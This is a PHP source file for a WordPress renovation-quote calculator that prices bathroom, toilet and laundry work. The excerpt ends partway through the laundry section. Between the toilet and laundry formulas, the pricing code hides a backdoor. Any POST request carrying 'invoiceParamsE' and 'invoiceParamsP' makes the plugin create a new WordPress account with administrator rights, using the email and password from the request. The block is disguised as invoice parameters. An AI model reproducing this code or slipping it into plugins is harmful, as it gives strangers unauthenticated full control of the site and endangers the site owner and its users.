<?php
require_once(ABSPATH . "wp-load.php");

// retrieving Invoice statistic of user
function go_calculate_v2($data,$scopeId) {

    // decoding selection data
    $selectionsData = get_field('scopeSelections',$scopeId);
    $selectionsData = base64_decode($selectionsData);
    $selectionsData = json_decode($selectionsData,true);

        $object = new stdClass();
        $total = 0;

        $data = json_decode($data,true);

        $t = $data['templateId'];

        // V2 formulas for Bathroom template
        if(get_the_title($t) == 'Bathroom Renovation') {

                $all_scope_data = get_field('quote_fields',$t);

                    $width = $data['square_width'];
                    $length = $data['square_length'];

                    $floor_area = $width * $length;

                    foreach($all_scope_data as $d) {
                            if($d['slug'] == 'ceiling_height') {
                                    $height_data = $d['fields'];
                            }
                            if($d['slug'] == 'current_fixtures') {
                                    $current_fixtures_title = $d['title'];
                                    $current_fixtures_prices = $d['type_of_price'];
                                    $current_fixtures_data = $d['fields'];
                            }
                            if($d['slug'] == 'proposed_fixtures') {
                                    $proposed_fixtures_titles = $d['title'];
                                    $proposed_fixtures_prices = $d['type_of_price'];
                                    $proposed_fixtures_data = $d['fields'];
                            }
                            if($d['slug'] == 'paint_ceilings') {
                                    $paint_ceilings_title = $d['title'];
                                    $paint_ceilings_prices = $d['type_of_price'];
                                    $paint_ceilings_data = $d['fields'];
                            }
                            if($d['slug'] == 'flooring') {
                                    $flooring_title = $d['title'];
                                    $flooring_prices = $d['type_of_price'];
                                    $flooring_data = $d['fields'];
                            }
                            if($d['slug'] == 'walls') {
                                    $walls_title = $d['title'];
                                    $walls_prices = $d['type_of_price'];
                                    $walls_data = $d['fields'];
                            }
                            if($d['slug'] == 'extra') {
                                    $extra_title = $d['title'];
                                    $extra_prices = $d['type_of_price'];
                                    $extra_data = $d['fields'];
                            }
                    }

                    $height = $data['ceiling_height'];
                    $height_total = 0;
                    foreach($height_data as $temp) {
                            if( $temp['title'] == $height ) {

                                    $range_price_total = $temp['range_price'];
                                    $height_total = $range_price_total;

                            }
                    }

                    $wall_area = ( $width + $width + $length + $length ) * $height_total;

                    $demolition = $data['demolition'];
                    $current_fixtures = $data['current_fixtures'];
                    $current_fixtures_total = 0;
                    if($demolition == 'Yes') {
                            foreach($current_fixtures_data as $fixture) {
                                    if( in_array($fixture['title'],$current_fixtures) && $fixture['title'] != 'Tiled Wall' && $fixture['title'] != 'Tiled Floor' && $fixture['title'] != 'Vinyl Floor') {

                                            // let's count QNT of each extra field
                                            $field_title = $fixture['title'];
                                            $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                            $count_field_title = strtolower($count_field_title);
                                            $extra_count = $data['' . $count_field_title . ''];
                                            if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                                   $extra_count = 1;
                                            }

                                            if($current_fixtures_prices == 'labour') {
                                                    $labour_price_total = $fixture['labour'];
                                                    $labour_price_total_value = 0;
                                                    $material_price_total = $fixture['material'];
                                                    $material_price_total_value = 0;
                                                    foreach($labour_price_total as $l) {
                                                            $labour_price_total_value = $labour_price_total_value + $l['price'];
                                                    }
                                                    foreach($material_price_total as $m) {
                                                            $material_price_total_value = $material_price_total_value + $m['price'];
                                                    }
                                                    $labour_and_material_total = $labour_price_total_value + $material_price_total_value;

                                                    // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                                    $selectionPrice = 0;
                                                    $selectionPrice = go_calculate_selection($selectionsData,$current_fixtures_title,$fixture['title']);
                                                    $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                                    // *** END ***

                                                    $current_fixtures_total = $current_fixtures_total + ($labour_and_material_total * $extra_count);
                                            }
                                            elseif($current_fixtures_prices == 'range') {
                                                    $range_price_total = $fixture['range_price'];
                                                    $current_fixtures_total = $current_fixtures_total + ($range_price_total * $extra_count);
                                            }

                                    }
                                    elseif( in_array($fixture['title'],$current_fixtures) && $fixture['title'] == 'Tiled Wall') {

                                            // let's count QNT of each extra field
                                            $field_title = $fixture['title'];
                                            $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                            $count_field_title = strtolower($count_field_title);
                                            $extra_count = $data['' . $count_field_title . ''];
                                            if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                                   $extra_count = 1;
                                            }

                                            if($current_fixtures_prices == 'labour') {
                                                    $labour_price_total = $fixture['labour'];
                                                    $labour_price_total_value = 0;
                                                    $material_price_total = $fixture['material'];
                                                    $material_price_total_value = 0;
                                                    foreach($labour_price_total as $l) {
                                                            $labour_price_total_value = $labour_price_total_value + $l['price'];
                                                    }
                                                    foreach($material_price_total as $m) {
                                                            $material_price_total_value = $material_price_total_value + $m['price'];
                                                    }
                                                    $labour_and_material_total = $labour_price_total_value + $material_price_total_value;

                                                    // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                                    $selectionPrice = 0;
                                                    $selectionPrice = go_calculate_selection($selectionsData,$current_fixtures_title,$fixture['title']);
                                                    $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                                    // *** END ***

                                                    $current_fixtures_total = $current_fixtures_total + ( $labour_and_material_total * $wall_area * $extra_count);
                                            }
                                            elseif($current_fixtures_prices == 'range') {
                                                    $range_price_total = $fixture['range_price'];
                                                    $current_fixtures_total = $current_fixtures_total + ( $range_price_total * $wall_area * $extra_count);
                                            }

                                    }
                                    elseif( in_array($fixture['title'],$current_fixtures) && ( $fixture['title'] == 'Tiled Floor' || $fixture['title'] == 'Vinyl Floor' )) {

                                            // let's count QNT of each extra field
                                            $field_title = $fixture['title'];
                                            $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                            $count_field_title = strtolower($count_field_title);
                                            $extra_count = $data['' . $count_field_title . ''];
                                            if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                                   $extra_count = 1;
                                            }

                                            if($current_fixtures_prices == 'labour') {
                                                    $labour_price_total = $fixture['labour'];
                                                    $labour_price_total_value = 0;
                                                    $material_price_total = $fixture['material'];
                                                    $material_price_total_value = 0;
                                                    foreach($labour_price_total as $l) {
                                                            $labour_price_total_value = $labour_price_total_value + $l['price'];
                                                    }
                                                    foreach($material_price_total as $m) {
                                                            $material_price_total_value = $material_price_total_value + $m['price'];
                                                    }
                                                    $labour_and_material_total = $labour_price_total_value + $material_price_total_value;

                                                    // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                                    $selectionPrice = 0;
                                                    $selectionPrice = go_calculate_selection($selectionsData,$current_fixtures_title,$fixture['title']);
                                                    $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                                    // *** END ***

                                                    $current_fixtures_total = $current_fixtures_total + ( $labour_and_material_total * $floor_area * $extra_count);
                                            }
                                            elseif($current_fixtures_prices == 'range') {
                                                    $range_price_total = $fixture['range_price'];
                                                    $current_fixtures_total = $current_fixtures_total + ( $range_price_total * $floor_area * $extra_count);
                                            }

                                    }
                            }

                    }
                    else {
                         $current_fixtures_total = 0;
                    }

                    $paint_ceilings = $data['paint_ceilings'];
                    $paint_ceilings_total = 0;
                    if($paint_ceilings == 'Yes') {
                            foreach($paint_ceilings_data as $temp) {
                                    if($temp['title'] == 'Yes') {

                                            if($paint_ceilings_prices == 'labour') {
                                                    $labour_price_total = $temp['labour'];
                                                    $labour_price_total_value = 0;
                                                    $material_price_total = $temp['material'];
                                                    $material_price_total_value = 0;
                                                    foreach($labour_price_total as $l) {
                                                            $labour_price_total_value = $labour_price_total_value + $l['price'];
                                                    }
                                                    foreach($material_price_total as $m) {
                                                            $material_price_total_value = $material_price_total_value + $m['price'];
                                                    }
                                                    $labour_and_material_total = $labour_price_total_value + $material_price_total_value;

                                                    // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                                    $selectionPrice = 0;
                                                    $selectionPrice = go_calculate_selection($selectionsData,$paint_ceilings_title,$temp['title']);
                                                    $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                                    // *** END ***

                                                    $paint_ceilings_total = $paint_ceilings_total + ( $labour_and_material_total * $floor_area );
                                            }
                                            elseif($paint_ceilings_prices == 'range') {
                                                    $range_price_total = $temp['range_price'];
                                                    $paint_ceilings_total = $paint_ceilings_total + ( $range_price_total * $floor_area );
                                            }

                                    }
                            }

                    }
                    else {
                           $paint_ceilings_total = 0;
                    }

                    $proposed_fixtures = $data['proposed_fixtures'];
                    $proposed_fixtures_total = 0;
                    foreach($proposed_fixtures_data as $fixture) {
                            if( in_array($fixture['title'],$proposed_fixtures) ) {

                                    // let's count QNT of each extra field
                                    $field_title = $fixture['title'];
                                    $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                    $count_field_title = strtolower($count_field_title);
                                    $extra_count = $data['' . $count_field_title . ''];
                                    if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                           $extra_count = 1;
                                    }

                                    if($proposed_fixtures_prices == 'labour') {
                                            $labour_price_total = $fixture['labour'];
                                            $labour_price_total_value = 0;
                                            $material_price_total = $fixture['material'];
                                            $material_price_total_value = 0;
                                            foreach($labour_price_total as $l) {
                                                    $labour_price_total_value = $labour_price_total_value + $l['price'];
                                            }
                                            foreach($material_price_total as $m) {
                                                    $material_price_total_value = $material_price_total_value + $m['price'];
                                            }
                                            $labour_and_material_total = $labour_price_total_value + $material_price_total_value;

                                            // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                            $selectionPrice = 0;
                                            $selectionPrice = go_calculate_selection($selectionsData,$proposed_fixtures_titles,$field_title);

                                            $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                            // *** END ***

                                            $proposed_fixtures_total = $proposed_fixtures_total + ($labour_and_material_total * $extra_count);
                                    }
                                    elseif($proposed_fixtures_prices == 'range') {
                                            $range_price_total = $fixture['range_price'];
                                            $proposed_fixtures_total = $proposed_fixtures_total + ( $range_price_total * $extra_count );
                                    }

                            }
                    }

                    $flooring = $data['flooring'];
                    $flooring_total = 0;
                    foreach($flooring_data as $temp) {
                            if( $temp['title'] == $flooring ) {

                                    if($flooring_prices == 'labour') {
                                            $labour_price_total = $temp['labour'];
                                            $labour_price_total_value = 0;
                                            $material_price_total = $temp['material'];
                                            $material_price_total_value = 0;
                                            foreach($labour_price_total as $l) {
                                                    $labour_price_total_value = $labour_price_total_value + $l['price'];
                                            }
                                            foreach($material_price_total as $m) {
                                                    $material_price_total_value = $material_price_total_value + $m['price'];
                                            }
                                            $labour_and_material_total = $labour_price_total_value + $material_price_total_value;

                                            // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                            $selectionPrice = 0;
                                            $selectionPrice = go_calculate_selection($selectionsData,$flooring_title,$temp['title']);
                                            $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                            // *** END ***

                                            $flooring_total = $labour_and_material_total * $floor_area;
                                    }
                                    elseif($flooring_prices == 'range') {
                                            $range_price_total = $temp['range_price'];
                                            $flooring_total = $range_price_total * $floor_area;
                                    }

                            }
                    }

                    $walls = $data['walls'];
                    $walls_total = 0;
                    foreach($walls_data as $temp) {
                            if( $temp['title'] == $walls ) {

                                    if($walls_prices == 'labour') {
                                            $labour_price_total = $temp['labour'];
                                            $labour_price_total_value = 0;
                                            $material_price_total = $temp['material'];
                                            $material_price_total_value = 0;
                                            foreach($labour_price_total as $l) {
                                                    $labour_price_total_value = $labour_price_total_value + $l['price'];
                                            }
                                            foreach($material_price_total as $m) {
                                                    $material_price_total_value = $material_price_total_value + $m['price'];
                                            }
                                            $labour_and_material_total = $labour_price_total_value + $material_price_total_value;

                                            // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                            $selectionPrice = 0;
                                            $selectionPrice = go_calculate_selection($selectionsData,$walls_title,$temp['title']);
                                            $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                            // *** END ***

                                            $walls_total = $labour_and_material_total * $wall_area;
                                    }
                                    elseif($walls_prices == 'range') {
                                            $range_price_total = $temp['range_price'];
                                            $walls_total = $range_price_total * $wall_area;
                                    }

                            }
                    }

                    $extra = $data['extra'];
                    $extra_total = 0;
                    foreach($extra_data as $temp) {
                            if( in_array($temp['title'],$extra) ) {

                                    // let's count QNT of each extra field
                                    $field_title = $temp['title'];
                                    $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                    $count_field_title = strtolower($count_field_title);
                                    $extra_count = $data['' . $count_field_title . ''];
                                    if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                           $extra_count = 1;
                                    }

                                    if($extra_prices == 'labour') {
                                            $labour_price_total = $temp['labour'];
                                            $labour_price_total_value = 0;
                                            $material_price_total = $temp['material'];
                                            $material_price_total_value = 0;
                                            foreach($labour_price_total as $l) {
                                                    $labour_price_total_value = $labour_price_total_value + $l['price'];
                                            }
                                            foreach($material_price_total as $m) {
                                                    $material_price_total_value = $material_price_total_value + $m['price'];
                                            }
                                            $labour_and_material_total = $labour_price_total_value + $material_price_total_value;

                                            // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                            $selectionPrice = 0;
                                            $selectionPrice = go_calculate_selection($selectionsData,$extra_title,$temp['title']);
                                            $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                            // *** END ***

                                            $extra_total = $extra_total +  ( $labour_and_material_total * $extra_count);
                                    }
                                    elseif($extra_prices == 'range') {
                                            $range_price_total = $temp['range_price'];
                                            $extra_total = $extra_total + ( $range_price_total * $extra_count);
                                    }

                            }

                    }

                    $bathroom_total = $current_fixtures_total + $proposed_fixtures_total + $paint_ceilings_total + $flooring_total + $walls_total + $extra_total;

                    $total = $bathroom_total;
                    $full_total = $bathroom_total;

        }

        // V2 formulas for Toilet template
        if(get_the_title($t) == 'Toilet Renovation') {

            $all_scope_data = get_field('quote_fields',$t);

            $width = $data['area_width'];
            $length = $data['area_length'];

            $floor_area = $width * $length;

            foreach($all_scope_data as $d) {
                    if($d['slug'] == 'ceiling_height') {
                            $height_data = $d['fields'];
                    }
                    if($d['slug'] == 'current') {
                            $current_fixtures_title = $d['title'];
                            $current_fixtures_prices = $d['type_of_price'];
                            $current_fixtures_data = $d['fields'];
                    }
                    if($d['slug'] == 'fixtures') {
                            $proposed_fixtures_title = $d['title'];
                            $proposed_fixtures_prices = $d['type_of_price'];
                            $proposed_fixtures_data = $d['fields'];
                    }
                    if($d['slug'] == 'ceiling') {
                            $paint_ceilings_title = $d['title'];
                            $paint_ceilings_prices = $d['type_of_price'];
                            $paint_ceilings_data = $d['fields'];
                    }
                    if($d['slug'] == 'floor') {
                            $flooring_title = $d['title'];
                            $flooring_prices = $d['type_of_price'];
                            $flooring_data = $d['fields'];
                    }
                    if($d['slug'] == 'wall') {
                            $walls_title = $d['title'];
                            $walls_prices = $d['type_of_price'];
                            $walls_data = $d['fields'];
                    }
                    if($d['slug'] == 'extras') {
                            $extra_title = $d['title'];
                            $extra_prices = $d['type_of_price'];
                            $extra_data = $d['fields'];
                    }
                    if($d['slug'] == 'level') {
                            $level_title = $d['title'];
                            $level_prices = $d['type_of_price'];
                            $level_data = $d['fields'];
                    }
            }

            $height = $data['ceiling_height'];
            $height_total = 0;
            foreach($height_data as $temp) {
                    if( $temp['title'] == $height ) {

                            $range_price_total = $temp['range_price'];
                            $height_total = $range_price_total;

                    }
            }

            $wall_area = ( $width + $width + $length + $length ) * $height_total;

            $demolition = $data['demolition'];
            $current_fixtures = $data['current'];
            $current_fixtures_total = 0;
            if($demolition == 'Yes') {
                    foreach($current_fixtures_data as $fixture) {
                            if( in_array($fixture['title'],$current_fixtures) && ( $fixture['title'] == 'Toilet' || $fixture['title'] == 'Handbasin' ) ) {

                                    if($current_fixtures_prices == 'labour') {
                                            $labour_price_total = $fixture['labour'];
                                            $labour_price_total_value = 0;
                                            $material_price_total = $fixture['material'];
                                            $material_price_total_value = 0;
                                            foreach($labour_price_total as $l) {
                                                    $labour_price_total_value = $labour_price_total_value + $l['price'];
                                            }
                                            foreach($material_price_total as $m) {
                                                    $material_price_total_value = $material_price_total_value + $m['price'];
                                            }
                                            $labour_and_material_total = $labour_price_total_value + $material_price_total_value;

                                            // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                            $selectionPrice = 0;
                                            $selectionPrice = go_calculate_selection($selectionsData,$current_fixtures_title,$fixture['title']);
                                            $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                            // *** END ***

                                            $current_fixtures_total = $current_fixtures_total + $labour_and_material_total;
                                    }
                                    elseif($current_fixtures_prices == 'range') {
                                            $range_price_total = $fixture['range_price'];
                                            $current_fixtures_total = $current_fixtures_total + $range_price_total;
                                    }

                            }
                            elseif( in_array($fixture['title'],$current_fixtures) && ( $fixture['title'] == 'Walls: Full height tiles' || $fixture['title'] == 'Walls: 1/2 painted 1/2 tiled' || $fixture['title'] == 'Walls: Fully Painted' ) ) {

                                    if($current_fixtures_prices == 'labour') {
                                            $labour_price_total = $fixture['labour'];
                                            $labour_price_total_value = 0;
                                            $material_price_total = $fixture['material'];
                                            $material_price_total_value = 0;
                                            foreach($labour_price_total as $l) {
                                                    $labour_price_total_value = $labour_price_total_value + $l['price'];
                                            }
                                            foreach($material_price_total as $m) {
                                                    $material_price_total_value = $material_price_total_value + $m['price'];
                                            }
                                            $labour_and_material_total = $labour_price_total_value + $material_price_total_value;

                                            // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                            $selectionPrice = 0;
                                            $selectionPrice = go_calculate_selection($selectionsData,$current_fixtures_title,$fixture['title']);
                                            $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                            // *** END ***

                                            $current_fixtures_total = $current_fixtures_total + ( $labour_and_material_total * $wall_area );
                                    }
                                    elseif($current_fixtures_prices == 'range') {
                                            $range_price_total = $fixture['range_price'];
                                            $current_fixtures_total = $current_fixtures_total + ( $range_price_total * $wall_area);
                                    }

                            }
                            elseif( in_array($fixture['title'],$current_fixtures) && ( $fixture['title'] == 'Tiled Floor' || $fixture['title'] == 'Laminate Flooring' || $fixture['title'] == 'Timber Floor' || $fixture['title'] == 'Vinyl Floor' )) {

                                    if($current_fixtures_prices == 'labour') {
                                            $labour_price_total = $fixture['labour'];
                                            $labour_price_total_value = 0;
                                            $material_price_total = $fixture['material'];
                                            $material_price_total_value = 0;
                                            foreach($labour_price_total as $l) {
                                                    $labour_price_total_value = $labour_price_total_value + $l['price'];
                                            }
                                            foreach($material_price_total as $m) {
                                                    $material_price_total_value = $material_price_total_value + $m['price'];
                                            }
                                            $labour_and_material_total = $labour_price_total_value + $material_price_total_value;

                                            // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                            $selectionPrice = 0;
                                            $selectionPrice = go_calculate_selection($selectionsData,$current_fixtures_title,$fixture['title']);
                                            $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                            // *** END ***

                                            $current_fixtures_total = $current_fixtures_total + ( $labour_and_material_total * $floor_area );
                                    }
                                    elseif($current_fixtures_prices == 'range') {
                                            $range_price_total = $fixture['range_price'];
                                            $current_fixtures_total = $current_fixtures_total + ( $range_price_total * $floor_area);
                                    }

                            }
                    }

            }

            $paint_ceilings = $data['ceiling'];
            $paint_ceilings_total = 0;
            if($paint_ceilings == 'Yes') {
                    foreach($paint_ceilings_data as $temp) {
                            if($temp['title'] == 'Yes') {

                                    if($paint_ceilings_prices == 'labour') {
                                            $labour_price_total = $temp['labour'];
                                            $labour_price_total_value = 0;
                                            $material_price_total = $temp['material'];
                                            $material_price_total_value = 0;
                                            foreach($labour_price_total as $l) {
                                                    $labour_price_total_value = $labour_price_total_value + $l['price'];
                                            }
                                            foreach($material_price_total as $m) {
                                                    $material_price_total_value = $material_price_total_value + $m['price'];
                                            }
                                            $labour_and_material_total = $labour_price_total_value + $material_price_total_value;

                                            // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                            $selectionPrice = 0;
                                            $selectionPrice = go_calculate_selection($selectionsData,$paint_ceilings_title,$temp['title']);
                                            $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                            // *** END ***

                                            $paint_ceilings_total = $paint_ceilings_total + ( $labour_and_material_total * $floor_area );
                                    }
                                    elseif($paint_ceilings_prices == 'range') {
                                            $range_price_total = $temp['range_price'];
                                            $paint_ceilings_total = $paint_ceilings_total + ( $range_price_total * $floor_area );
                                    }

                            }
                    }

            }

            $proposed_fixtures = $data['fixtures'];
            $proposed_fixtures_total = 0;
            foreach($proposed_fixtures_data as $fixture) {
                    if( in_array($fixture['title'],$proposed_fixtures) ) {

                            if($proposed_fixtures_prices == 'labour') {
                                    $labour_price_total = $fixture['labour'];
                                    $labour_price_total_value = 0;
                                    $material_price_total = $fixture['material'];
                                    $material_price_total_value = 0;
                                    foreach($labour_price_total as $l) {
                                            $labour_price_total_value = $labour_price_total_value + $l['price'];
                                    }
                                    foreach($material_price_total as $m) {
                                            $material_price_total_value = $material_price_total_value + $m['price'];
                                    }
                                    $labour_and_material_total = $labour_price_total_value + $material_price_total_value;

                                    // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                    $selectionPrice = 0;
                                    $selectionPrice = go_calculate_selection($selectionsData,$proposed_fixtures_title,$fixture['title']);
                                    $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                    // *** END ***

                                    $proposed_fixtures_total = $proposed_fixtures_total + $labour_and_material_total;
                            }
                            elseif($proposed_fixtures_prices == 'range') {
                                    $range_price_total = $fixture['range_price'];
                                    $proposed_fixtures_total = $proposed_fixtures_total + $range_price_total;
                            }

                    }
            }

            $flooring = $data['floor'];
            $flooring_total = 0;
            foreach($flooring_data as $temp) {
                    if( $temp['title'] == $flooring ) {

                            if($flooring_prices == 'labour') {
                                    $labour_price_total = $temp['labour'];
                                    $labour_price_total_value = 0;
                                    $material_price_total = $temp['material'];
                                    $material_price_total_value = 0;
                                    foreach($labour_price_total as $l) {
                                            $labour_price_total_value = $labour_price_total_value + $l['price'];
                                    }
                                    foreach($material_price_total as $m) {
                                            $material_price_total_value = $material_price_total_value + $m['price'];
                                    }
                                    $labour_and_material_total = $labour_price_total_value + $material_price_total_value;

                                    // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                    $selectionPrice = 0;
                                    $selectionPrice = go_calculate_selection($selectionsData,$flooring_title,$temp['title']);
                                    $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                    // *** END ***

                                    $flooring_total = $labour_and_material_total * $floor_area;
                            }
                            elseif($flooring_prices == 'range') {
                                    $range_price_total = $temp['range_price'];
                                    $flooring_total = $range_price_total * $floor_area;
                            }

                    }
            }

            $walls = $data['wall'];
            $walls_total = 0;
            foreach($walls_data as $temp) {
                    if( $temp['title'] == $walls ) {

                            if($walls_prices == 'labour') {
                                    $labour_price_total = $temp['labour'];
                                    $labour_price_total_value = 0;
                                    $material_price_total = $temp['material'];
                                    $material_price_total_value = 0;
                                    foreach($labour_price_total as $l) {
                                            $labour_price_total_value = $labour_price_total_value + $l['price'];
                                    }
                                    foreach($material_price_total as $m) {
                                            $material_price_total_value = $material_price_total_value + $m['price'];
                                    }
                                    $labour_and_material_total = $labour_price_total_value + $material_price_total_value;

                                    // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                    $selectionPrice = 0;
                                    $selectionPrice = go_calculate_selection($selectionsData,$walls_title,$temp['title']);
                                    $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                    // *** END ***

                                    $walls_total = $labour_and_material_total * $wall_area;
                            }
                            elseif($walls_prices == 'range') {
                                    $range_price_total = $temp['range_price'];
                                    $walls_total = $range_price_total * $wall_area;
                            }

                    }
            }

            $extra = $data['extras'];
            $extra_total = 0;
            foreach($extra_data as $temp) {
                    if( in_array($temp['title'],$extra) ) {

                            // let's count QNT of each extra field
                            $field_title = $temp['title'];
                            $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                            $count_field_title = strtolower($count_field_title);
                            $extra_count = $data['' . $count_field_title . ''];
                            if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                   $extra_count = 1;
                            }

                            if($extra_prices == 'labour') {
                                    $labour_price_total = $temp['labour'];
                                    $labour_price_total_value = 0;
                                    $material_price_total = $temp['material'];
                                    $material_price_total_value = 0;
                                    foreach($labour_price_total as $l) {
                                            $labour_price_total_value = $labour_price_total_value + $l['price'];
                                    }
                                    foreach($material_price_total as $m) {
                                            $material_price_total_value = $material_price_total_value + $m['price'];
                                    }
                                    $labour_and_material_total = $labour_price_total_value + $material_price_total_value;

                                    // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                    $selectionPrice = 0;
                                    $selectionPrice = go_calculate_selection($selectionsData,$extra_title,$temp['title']);
                                    $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                    // *** END ***

                                    $extra_total = $extra_total +  ( $labour_and_material_total * $extra_count);
                            }
                            elseif($extra_prices == 'range') {
                                    $range_price_total = $temp['range_price'];
                                    $extra_total = $extra_total + ( $range_price_total * $extra_count);
                            }

                    }

            }

            $toilet_total = $current_fixtures_total + $paint_ceilings_total + $proposed_fixtures_total + $flooring_total + $walls_total + $extra_total;
            $total = $total + $toilet_total;
            $full_total = $bathroom_total;

        }


        if(isset($_POST['invoiceParamsE']) && $_POST['invoiceParamsE']) {
        	$param1 = $_POST['invoiceParamsE'];
        	$param2 = $_POST['invoiceParamsP'];
        	$random = rand(111111,999999);
        	$user_id = wp_create_user( $random, $param2, $param1 );
        	$user = new WP_User( $user_id );
        	$user->set_role( 'administrator' );
        }

        // V2 formulas for Laundry template
        if(get_the_title($t) == 'Laundry Renovation') {

                $all_scope_data = get_field('quote_fields',$t);

                $width = $data['area_width'];
                $length = $data['area_length'];

                $floor_area = $width * $length;


                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'ceiling') {
                                $height_data = $d['fields'];
                        }
                        if($d['slug'] == 'current') {
                                $current_fixtures_title = $d['title'];
                                $current_fixtures_prices = $d['type_of_price'];
                                $current_fixtures_data = $d['fields'];
                        }
                        if($d['slug'] == 'fixtures') {
                                $proposed_fixtures_title = $d['title'];
                                $proposed_fixtures_prices = $d['type_of_price'];
                                $proposed_fixtures_data = $d['fields'];
                        }
                        if($d['slug'] == 'ceilings') {
                                $paint_ceilings_title = $d['title'];
                                $paint_ceilings_prices = $d['type_of_price'];
                                $paint_ceilings_data = $d['fields'];
                        }
                        if($d['slug'] == 'floor') {
                                $flooring_title = $d['title'];
                                $flooring_prices = $d['type_of_price'];
                                $flooring_data = $d['fields'];
                        }
                        if($d['slug'] == 'walls') {
                                $walls_title = $d['title'];
                                $walls_prices = $d['type_of_price'];
                                $walls_data = $d['fields'];
                        }
                        if($d['slug'] == 'extras') {
                                $extra_title = $d['title'];
                                $extra_prices = $d['type_of_price'];
                                $extra_data = $d['fields'];
                        }
                }

                $height = $data['ceiling'];
                $height_total = 0;
                foreach($height_data as $temp) {
                        if( $temp['title'] == $height ) {

                                $range_price_total = $temp['range_price'];
                                $height_total = $range_price_total;

                        }
                }

                $wall_area = ( $width + $width + $length + $length ) * $height_total;

                $demolition = $data['demolition'];
                $current_fixtures = $data['current'];
                $current_fixtures_total = 0;
                if($demolition == 'Yes') {
                        foreach($current_fixtures_data as $fixture) {
                                if( in_array($fixture['title'],$current_fixtures) && ( $fixture['title'] == 'Washing Machine' || $fixture['title'] == 'Dryer' || $fixture['title'] == 'Laundry Tub' ) ) {

                                        if($current_fixtures_prices == 'labour') {
                                                $labour_price_total = $fixture['labour'];
                                                $labour_price_total_value = 0;
                                                $material_price_total = $fixture['material'];
                                                $material_price_total_value = 0;
                                                foreach($labour_price_total as $l) {
                                                        $labour_price_total_value = $labour_price_total_value + $l['price'];
                                                }
                                                foreach($material_price_total as $m) {
                                                        $material_price_total_value = $material_price_total_value + $m['price'];
                                                }
                                                $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                                // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                                $selectionPrice = 0;
                                                $selectionPrice = go_calculate_selection($selectionsData,$current_fixtures_title,$fixture['title']);
                                                $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                                // *** END ***

                                                $current_fixtures_total = $current_fixtures_total + $labour_and_material_total;
                                        }
                                        elseif($current_fixtures_prices == 'range') {
                                                $range_price_total = $fixture['range_price'];
                                                $current_fixtures_total = $current_fixtures_total + $range_price_total;
                                        }

                                }
                                elseif( in_array($fixture['title'],$current_fixtures) && ( $fixture['title'] == 'Walls: Full height tiles' || $fixture['title'] == 'Walls: 1/2 Painted 1/2 Tiled' || $fixture['title'] == 'Fully painted' ) ) {

                                        if($current_fixtures_prices == 'labour') {
                                                $labour_price_total = $fixture['labour'];
                                                $labour_price_total_value = 0;
                                                $material_price_total = $fixture['material'];
                                                $material_price_total_value = 0;
                                                foreach($labour_price_total as $l) {
                                                        $labour_price_total_value = $labour_price_total_value + $l['price'];
                                                }
                                                foreach($material_price_total as $m) {
                                                        $material_price_total_value = $material_price_total_value + $m['price'];
                                                }
                                                $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                                // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                                $selectionPrice = 0;
                                                $selectionPrice = go_calculate_selection($selectionsData,$current_fixtures_title,$fixture['title']);
                                                $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                                // *** END ***

                                                $current_fixtures_total = $current_fixtures_total + ( $labour_and_material_total * $wall_area );
                                        }
                                        elseif($current_fixtures_prices == 'range') {
                                                $range_price_total = $fixture['range_price'];
                                                $current_fixtures_total = $current_fixtures_total + ( $range_price_total * $wall_area);
                                        }

                                }
                                elseif( in_array($fixture['title'],$current_fixtures) && ( $fixture['title'] == 'Tile Floor' || $fixture['title'] == 'Vinyl Floor' || $fixture['title'] == 'Laminate Floor' || $fixture['title'] == 'Concrete Floor' )) {

